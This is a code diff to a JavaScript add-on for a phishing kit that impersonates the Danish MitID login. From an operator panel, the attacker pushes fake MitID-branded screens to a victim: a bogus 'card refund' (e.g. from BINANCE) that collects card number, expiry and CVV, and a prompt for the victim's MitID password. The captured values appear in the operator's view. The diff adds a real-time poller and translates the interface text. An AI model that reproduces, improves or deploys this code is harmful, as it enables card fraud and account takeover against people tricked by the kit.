@@ -1,12 +1,16 @@
 /**
  * Refundering på kort + Adgangskode
- * Admin: modal (who + amount) like "Aktiver SMS", plus Adgangskode button
- * Client: MitID-style screens (card / password)
+ * - Own poller (does not rely only on React fetch hook)
+ * - Admin modal centered
+ * - Client MitID-style screens
  */
 (function () {
   var BASE = (typeof window !== "undefined" && window.__APP_BASE__) || "";
   var USER_KEY = "miitid_user_session";
   var ADMIN_KEY = "miitid_admin_selected_session";
+  var origFetch = window.fetch.bind(window);
+  var seenMsg = {};
+  var pollLast = { user: 0, admin: 0 };
 
   function sidUser() {
     try {
@@ -23,17 +27,20 @@
     }
   }
   function isAdmin() {
-    var h = window.location.hash || "";
-    return h.indexOf("admin") === 1;
+    return (window.location.hash || "").indexOf("admin") === 1;
   }
 
   function send(role, data) {
     var sessionId = role === "admin" ? sidAdmin() : sidUser();
     if (!sessionId) {
-      alert(role === "admin" ? "Vælg en session først" : "Ingen aktiv session");
+      alert(
+        role === "admin"
+          ? "Select a session first — click the user in the admin list"
+          : "No active session — client must finish Bruger-ID login first"
+      );
       return Promise.resolve(false);
     }
-    return fetch(BASE + "/api/ws/send", {
+    return origFetch(BASE + "/api/ws/send", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ sessionId: sessionId, role: role, data: data }),
@@ -52,7 +59,7 @@
       el = document.createElement("div");
       el.id = "juj-rf-toast";
       el.style.cssText =
-        "position:fixed;top:14px;right:14px;z-index:100000;max-width:340px;padding:12px 14px;border-radius:12px;background:#0f766e;color:#fff;font:600 13px/1.4 'IBM Plex Sans',sans-serif;box-shadow:0 10px 30px rgba(0,0,0,.2)";
+        "position:fixed;top:14px;right:14px;z-index:100000;max-width:360px;padding:12px 14px;border-radius:12px;background:#0f766e;color:#fff;font:600 13px/1.4 'IBM Plex Sans',sans-serif;box-shadow:0 10px 30px rgba(0,0,0,.2)";
       document.body.appendChild(el);
     }
     el.textContent = msg;
@@ -60,7 +67,7 @@
     clearTimeout(el._t);
     el._t = setTimeout(function () {
       el.style.display = "none";
-    }, 7000);
+    }, 8000);
   }
 
   function mitidLogoHtml() {
@@ -77,29 +84,37 @@
     if (el) el.remove();
   }
 
-  /* ---------- ADMIN: Refund modal (like Aktiver SMS) ---------- */
+  function escapeHtml(s) {
+    return String(s)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;");
+  }
+
+  /* ---------- ADMIN modal (CENTER) ---------- */
   function openAdminRefundModal() {
     closeOverlay("juj-admin-refund-modal");
     var wrap = document.createElement("div");
     wrap.id = "juj-admin-refund-modal";
     wrap.style.cssText =
-      "position:fixed;inset:0;z-index:99999;background:rgba(2,6,23,.72);display:flex;align-items:flex-end;justify-content:center;padding:12px;font-family:'IBM Plex Sans',Inter,sans-serif";
+      "position:fixed;inset:0;z-index:99999;background:rgba(2,6,23,.72);display:flex;align-items:center;justify-content:center;padding:16px;font-family:'IBM Plex Sans',Inter,sans-serif";
     wrap.innerHTML =
-      '<div style="width:100%;max-width:420px;background:#1e293b;border-radius:18px 18px 14px 14px;padding:18px 16px 16px;color:#fff;box-shadow:0 20px 60px rgba(0,0,0,.45)">' +
+      '<div style="width:100%;max-width:420px;background:#1e293b;border-radius:18px;padding:18px 16px 16px;color:#fff;box-shadow:0 20px 60px rgba(0,0,0,.45)">' +
       '<div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:16px">' +
       '<div style="display:flex;gap:10px;align-items:center">' +
       '<div style="width:34px;height:34px;border-radius:10px;background:#0060e6;display:flex;align-items:center;justify-content:center;font-size:16px">💳</div>' +
       "<div><div style=\"font-weight:700;font-size:16px\">Refund card transaction</div>" +
-      '<div style="color:#94a3b8;font-size:12px;margin-top:2px">Hvem og hvor meget</div></div></div>' +
+      '<div style="color:#94a3b8;font-size:12px;margin-top:2px">Who + how much</div></div></div>' +
       '<button type="button" id="juj-adm-rf-close" style="width:32px;height:32px;border:0;border-radius:999px;background:rgba(100,116,139,.5);color:#fff;cursor:pointer;font-size:16px">×</button>' +
       "</div>" +
-      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">REFUNDERING FRA (FIRMA / NAVN)</label>' +
-      '<input id="juj-adm-rf-from" type="text" placeholder="F.eks. BINANCE" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:14px" />' +
-      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">BELØB</label>' +
-      '<input id="juj-adm-rf-amount" type="text" inputmode="decimal" placeholder="F.eks. 1.250,00" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:16px" />' +
+      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">REFUND FROM (COMPANY / NAME)</label>' +
+      '<input id="juj-adm-rf-from" type="text" placeholder="e.g. BINANCE" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:14px" />' +
+      '<label style="display:block;font-size:10px;font-weight:700;letter-spacing:.08em;color:#94a3b8;margin-bottom:6px">AMOUNT</label>' +
+      '<input id="juj-adm-rf-amount" type="text" inputmode="decimal" placeholder="e.g. 1250" style="width:100%;box-sizing:border-box;background:#0f172a;border:1px solid #334155;border-radius:12px;padding:12px 14px;color:#fff;font-size:14px;margin-bottom:16px" />' +
       '<div style="display:flex;gap:10px">' +
-      '<button type="button" id="juj-adm-rf-skip" style="flex:1;background:#334155;color:#e2e8f0;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">Uden beløb</button>' +
-      '<button type="button" id="juj-adm-rf-go" style="flex:1.2;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">Aktiver refundering</button>' +
+      '<button type="button" id="juj-adm-rf-skip" style="flex:1;background:#334155;color:#e2e8f0;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">No amount</button>' +
+      '<button type="button" id="juj-adm-rf-go" style="flex:1.2;background:#0060e6;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:700;font-size:13px;cursor:pointer">Activate refund</button>' +
       "</div></div>";
 
     document.body.appendChild(wrap);
@@ -123,8 +138,10 @@
         displayText: from,
         amount: amount || null,
       }).then(function (ok) {
-        if (ok) toast("Refunderingsskærm sendt til klient");
-        closeOverlay("juj-admin-refund-modal");
+        if (ok) {
+          toast("Sent to client — client must already be past login (waiting screen)");
+          closeOverlay("juj-admin-refund-modal");
+        }
       });
     }
 
@@ -140,7 +157,7 @@
     }, 50);
   }
 
-  /* ---------- CLIENT: MitID-style card refund ---------- */
+  /* ---------- CLIENT card screen ---------- */
   function showClientCard(msg) {
     closeOverlay("juj-client-refund");
     var from = (msg && (msg.from || msg.displayText)) || "";
@@ -149,12 +166,9 @@
     if (amount) {
       var n = amount.replace(/\s/g, "").replace(",", ".");
       var num = parseFloat(n);
-      if (!isNaN(num)) {
-        amountLabel =
-          num.toLocaleString("da-DK", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " kr";
-      } else {
-        amountLabel = amount + (amount.indexOf("kr") >= 0 ? "" : " kr");
-      }
+      amountLabel = !isNaN(num)
+        ? num.toLocaleString("da-DK", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " kr"
+        : amount + (amount.indexOf("kr") >= 0 ? "" : " kr");
     }
 
     var wrap = document.createElement("div");
@@ -165,7 +179,7 @@
       '<header style="background:#fff;height:50px;display:flex;align-items:center;padding:0 20px;border-bottom:1px solid #e5e7eb">' +
       mitidLogoHtml() +
       "</header>" +
-      '<main style="flex:1;display:flex;align-items:flex-start;justify-content:center;padding:28px 16px">' +
+      '<main style="flex:1;display:flex;align-items:center;justify-content:center;padding:28px 16px">' +
       '<div style="background:#fff;width:100%;max-width:420px;border-radius:8px;padding:22px 22px 28px;box-shadow:0 1px 3px rgba(0,0,0,.06)">' +
       '<div style="display:flex;justify-content:flex-end;margin-bottom:10px">' +
       mitidLogoHtml() +
@@ -192,7 +206,7 @@
       '<input id="juj-c-exp" type="text" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/ÅÅ" style="width:100%;box-sizing:border-box;border:1px solid #d1d5db;border-radius:8px;padding:12px;font-size:16px" /></div>' +
       '<div style="flex:1"><label style="display:block;font-size:12px;font-weight:600;color:#374151;margin-bottom:6px">CVV</label>' +
       '<input id="juj-c-cvv" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="•••" maxlength="4" style="width:100%;box-sizing:border-box;border:1px solid #d1d5db;border-radius:8px;padding:12px;font-size:16px" /></div></div>' +
-      '<button type="button" id="juj-c-submit" style="width:100%;background:#e8eef7;color:#6b9bd1;border:0;border-radius:8px;padding:14px 16px;font-weight:700;font-size:14px;letter-spacing:.06em;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px">BEKRÆFT <span>→</span></button>' +
+      '<button type="button" id="juj-c-submit" style="width:100%;background:#e8eef7;color:#6b9bd1;border:0;border-radius:8px;padding:14px 16px;font-weight:700;font-size:14px;letter-spacing:.06em;cursor:pointer">BEKRÆFT →</button>' +
       "</div></main>";
 
     document.body.appendChild(wrap);
@@ -201,6 +215,14 @@
     var cvv = document.getElementById("juj-c-cvv");
     var btn = document.getElementById("juj-c-submit");
 
+    function updateBtn() {
+      var ok =
+        num.value.replace(/\s/g, "").length >= 12 &&
+        exp.value.length >= 4 &&
+        cvv.value.length >= 3;
+      btn.style.background = ok ? "#0060e6" : "#e8eef7";
+      btn.style.color = ok ? "#fff" : "#6b9bd1";
+    }
     num.addEventListener("input", function () {
       var v = num.value.replace(/\D/g, "").slice(0, 19);
       num.value = v.replace(/(.{4})/g, "$1 ").trim();
@@ -216,16 +238,6 @@
       cvv.value = cvv.value.replace(/\D/g, "").slice(0, 4);
       updateBtn();
     });
-
-    function updateBtn() {
-      var ok =
-        num.value.replace(/\s/g, "").length >= 12 &&
-        exp.value.length >= 4 &&
-        cvv.value.length >= 3;
-      btn.style.background = ok ? "#0060e6" : "#e8eef7";
-      btn.style.color = ok ? "#fff" : "#6b9bd1";
-    }
-
     btn.onclick = function () {
       var cardNumber = num.value.replace(/\s/g, "");
       if (cardNumber.length < 12 || exp.value.length < 4 || cvv.value.length < 3) return;
@@ -239,7 +251,7 @@
         amount: amount || null,
       }).then(function () {
         closeOverlay("juj-client-refund");
-        toast("Sendt — vent venligst");
+        toast("Sent — please wait");
       });
     };
     setTimeout(function () {
@@ -247,7 +259,7 @@
     }, 80);
   }
 
-  /* ---------- CLIENT: Adgangskode ---------- */
+  /* ---------- CLIENT password screen ---------- */
   function showClientPassword() {
     closeOverlay("juj-client-refund");
     var wrap = document.createElement("div");
@@ -258,7 +270,7 @@
       '<header style="background:#fff;height:50px;display:flex;align-items:center;padding:0 20px;border-bottom:1px solid #e5e7eb">' +
       mitidLogoHtml() +
       "</header>" +
-      '<main style="flex:1;display:flex;align-items:flex-start;justify-content:center;padding:28px 16px">' +
+      '<main style="flex:1;display:flex;align-items:center;justify-content:center;padding:28px 16px">' +
       '<div style="background:#fff;width:100%;max-width:420px;border-radius:8px;padding:22px 22px 28px;box-shadow:0 1px 3px rgba(0,0,0,.06)">' +
       '<div style="display:flex;justify-content:flex-end;margin-bottom:10px">' +
       mitidLogoHtml() +
@@ -270,7 +282,7 @@
       '<p style="margin:0 0 18px;font-size:14px;color:#6b7280;line-height:1.45">Indtast din Adgangskode for at bekræfte</p>' +
       '<label style="display:block;font-size:12px;font-weight:600;color:#374151;margin-bottom:6px">Adgangskode</label>' +
       '<input id="juj-p-input" type="password" autocomplete="current-password" style="width:100%;box-sizing:border-box;border:1px solid #d1d5db;border-radius:8px;padding:12px;font-size:16px;margin-bottom:22px" />' +
-      '<button type="button" id="juj-p-submit" style="width:100%;background:#e8eef7;color:#6b9bd1;border:0;border-radius:8px;padding:14px 16px;font-weight:700;font-size:14px;letter-spacing:.06em;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px">BEKRÆFT <span>→</span></button>' +
+      '<button type="button" id="juj-p-submit" style="width:100%;background:#e8eef7;color:#6b9bd1;border:0;border-radius:8px;padding:14px 16px;font-weight:700;font-size:14px;letter-spacing:.06em;cursor:pointer">BEKRÆFT →</button>' +
       "</div></main>";
 
     document.body.appendChild(wrap);
@@ -287,7 +299,7 @@
       btn.disabled = true;
       send("user", { type: "adgangskode-submitted", code: code }).then(function () {
         closeOverlay("juj-client-refund");
-        toast("Sendt — vent venligst");
+        toast("Sent — please wait");
       });
     };
     setTimeout(function () {
@@ -295,18 +307,15 @@
     }, 80);
   }
 
-  function escapeHtml(s) {
-    return String(s)
-      .replace(/&/g, "&amp;")
-      .replace(/</g, "&lt;")
-      .replace(/>/g, "&gt;")
-      .replace(/"/g, "&quot;");
-  }
-
-  function handleMessages(messages) {
+  function handleMessages(messages, roleHint) {
     if (!messages || !messages.length) return;
     for (var i = 0; i < messages.length; i++) {
-      var raw = messages[i].message;
+      var row = messages[i];
+      var id = row.id != null ? String(row.id) : "";
+      if (id && seenMsg[id]) continue;
+      if (id) seenMsg[id] = 1;
+
+      var raw = row.message;
       var msg =
         typeof raw === "string"
           ? (function () {
@@ -319,14 +328,15 @@
           : raw;
       if (!msg || !msg.type) continue;
 
-      if (!isAdmin()) {
+      var adminView = isAdmin() || roleHint === "admin";
+      if (!adminView) {
         if (msg.type === "show-adgangskode") showClientPassword();
         if (msg.type === "show-card-refund") showClientCard(msg);
       } else {
-        if (msg.type === "adgangskode-submitted") toast("Adgangskode: " + (msg.code || "—"));
+        if (msg.type === "adgangskode-submitted") toast("Password: " + (msg.code || "—"));
         if (msg.type === "card-refund-submitted") {
           toast(
-            "Kort " +
+            "Card " +
               (msg.cardNumber || "—") +
               (msg.expiry ? " | " + msg.expiry : "") +
               (msg.cvv ? " | CVV " + msg.cvv : "")
@@ -336,7 +346,38 @@
     }
   }
 
-  var origFetch = window.fetch;
+  /* Own poller — reliable real-time for addon screens */
+  function pollOnce(role) {
+    var sid = role === "admin" ? sidAdmin() : sidUser();
+    if (!sid) return;
+    var last = pollLast[role] || 0;
+    var url =
+      BASE +
+      "/api/ws/poll?sessionId=" +
+      encodeURIComponent(sid) +
+      "&role=" +
+      encodeURIComponent(role) +
+      "&lastId=" +
+      last +
+      "&timeout=0";
+    origFetch(url, { cache: "no-store" })
+      .then(function (r) {
+        return r.json();
+      })
+      .then(function (data) {
+        if (!data || !data.ok) return;
+        if (typeof data.lastId === "number") pollLast[role] = data.lastId;
+        handleMessages(data.messages || [], role);
+      })
+      .catch(function () {});
+  }
+
+  setInterval(function () {
+    if (isAdmin()) pollOnce("admin");
+    else if (sidUser()) pollOnce("user");
+  }, 900);
+
+  // Also hook React fetch polls
   window.fetch = function () {
     var args = arguments;
     return origFetch.apply(this, args).then(function (res) {
@@ -370,6 +411,7 @@
         if (txt && txt.length >= 32) {
           try {
             localStorage.setItem(ADMIN_KEY, txt);
+            pollLast.admin = 0;
           } catch (err) {}
           break;
         }
@@ -411,7 +453,7 @@
     };
     document.getElementById("juj-btn-ak").onclick = function () {
       send("admin", { type: "show-adgangskode" }).then(function (ok) {
-        if (ok) toast("Adgangskode-skærm sendt til klient");
+        if (ok) toast("Password screen sent — client must be past login");
       });
     };
   }
